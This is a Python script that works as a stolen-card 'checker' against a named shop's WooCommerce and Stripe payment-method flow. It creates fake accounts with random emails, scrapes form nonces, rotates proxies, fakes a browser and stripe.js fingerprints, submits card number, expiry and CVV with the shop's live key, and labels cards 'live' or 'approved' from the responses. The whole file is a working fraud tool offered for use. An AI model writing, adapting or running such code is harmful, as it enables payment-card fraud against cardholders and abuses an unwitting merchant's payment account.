import requests
import re
import random
import string
import time
import asyncio

def _generate_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    rnd_digits = ''.join(random.choices(string.hexdigits.lower(), k=4))
    return f"{name}{rnd_digits}@{random.choice(domains)}"

def _format_proxy(proxy: str | None) -> dict | None:
    if not proxy:
        return None
    p = str(proxy).strip()
    if p.startswith(("http://", "https://", "socks5://", "socks4://")):
        return {"http": p, "https": p}
    parts = p.split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit():
            formatted = f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else:
            formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        return {"http": formatted, "https": formatted}
    elif len(parts) == 2:
        formatted = f"http://{parts[0]}:{parts[1]}"
        return {"http": formatted, "https": formatted}
    formatted = f"http://{p}"
    return {"http": formatted, "https": formatted}

def check_card_nemaneide_sync(cc: str, mm: str, yy: str, cvv: str, proxy_url: str | None = None) -> tuple[str, str, str]:
    """
    Stripe $0.00 Setup Intent Gate (shop.nemaneide.com).
    Returns: (status, message, brand)
    """
    if len(yy) == 4:
        yy = yy[-2:]
    mm = mm.zfill(2)

    base_url = "https://shop.nemaneide.com"
    pk = "pk_live_51ROOSi03FG8Au2CBvmO4o6DP0qA0RZrRrfZOnaBDsGPJGmufqblXi5kMzp8RwDVwaKd8ggjdazNJV7X72tBgnoFs00BuEsszoz"
    ua = "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36"

    rnd = lambda k: ''.join(random.choices(string.hexdigits.lower(), k=k))
    fn = lambda h, k: (m := re.search(rf'name="{k}"\s+value="([^"]+)"', h, re.I)) and m.group(1)
    jn = lambda h, k: (m := re.search(rf'"{k}"\s*:\s*"([^"]+)"', h)) and m.group(1)

    s = requests.Session()
    s.headers['User-Agent'] = ua

    proxies = _format_proxy(proxy_url)
    if proxies:
        s.proxies = proxies

    try:
        # Step 1: GET /my-account/
        r = s.get(f"{base_url}/my-account/", timeout=25)
        n = fn(r.text, 'woocommerce-register-nonce')
        if not n:
            return "error", "Failed to extract register nonce", "UNKNOWN"

        # Step 2: Register user session
        email = _generate_email()
        password = rnd(12)
        s.post(
            f"{base_url}/my-account/",
            headers={'content-type': 'application/x-www-form-urlencoded', 'origin': base_url, 'referer': f'{base_url}/my-account/'},
            data={
                'email': email,
                'password': password,
                'woocommerce-register-nonce': n,
                '_wp_http_referer': '/my-account/',
                'register': 'Registracija'
            },
            timeout=25
        )

        # Step 3: GET /my-account/payment-methods/
        r2 = s.get(f"{base_url}/my-account/payment-methods/", headers={'referer': f'{base_url}/my-account/'}, timeout=25)
        an = jn(r2.text, 'createAndConfirmSetupIntentNonce')
        if not an:
            return "error", "Failed to extract setup intent nonce", "UNKNOWN"

        # Step 4: Tokenize card via Stripe API
        stripe_res = s.post(
            'https://api.stripe.com/v1/payment_methods',
            headers={'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/'},
            data={
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_year]': yy,
                'card[exp_month]': mm,
                'billing_details[address][country]': 'US',
                'key': pk,
                '_stripe_version': '2024-06-20',
                'payment_user_agent': 'stripe.js/fe3c872f40; stripe-js-v3/fe3c872f40; payment-element; deferred-intent',
                'guid': rnd(48),
                'muid': rnd(32),
                'sid': rnd(32),
                'time_on_page': str(random.randint(5000, 15000))
            },
            timeout=25
        ).json()

        if 'error' in stripe_res:
            err_msg = stripe_res['error'].get('message', 'Declined')
            brand = stripe_res.get('card', {}).get('brand', 'UNKNOWN')
            err_lower = err_msg.lower()
            if "security code" in err_lower:
                return "live", err_msg, brand
            return "declined", err_msg, brand

        pm_id = stripe_res.get('id')
        brand = stripe_res.get('card', {}).get('brand', 'UNKNOWN')
        if not pm_id:
            return "error", "Failed to tokenize card", brand

        # Step 5: Confirm SetupIntent via AJAX
        confirm_res = s.post(
            f"{base_url}/",
            params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
            headers={
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': base_url,
                'referer': f'{base_url}/my-account/add-payment-method/',
                'x-requested-with': 'XMLHttpRequest'
            },
            data={
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': an
            },
            timeout=30
        ).json()

        if confirm_res.get('success'):
            return "approved", "Payment Method Added", brand

        dt = confirm_res.get('data', {})
        if isinstance(dt, dict):
            if dt.get('status') == 'requires_action':
                return "3ds", "Requires Action (3DS)", brand
            e = dt.get('error', {})
            msg = e.get('message', 'Unknown') if isinstance(e, dict) else str(e)
            low_msg = msg.lower()
            if "security code" in low_msg:
                return "live", msg, brand
            if "insufficient" in low_msg:
                return "live", msg, brand
            return "declined", msg, brand

        return "declined", str(dt), brand

    except Exception as e:
        return "error", str(e), "UNKNOWN"

async def check_card_nemaneide(cc: str, mm: str, yy: str, cvv: str, proxy_url: str | None = None) -> tuple[str, str, str]:
    return await asyncio.to_thread(check_card_nemaneide_sync, cc, mm, yy, cvv, proxy_url)
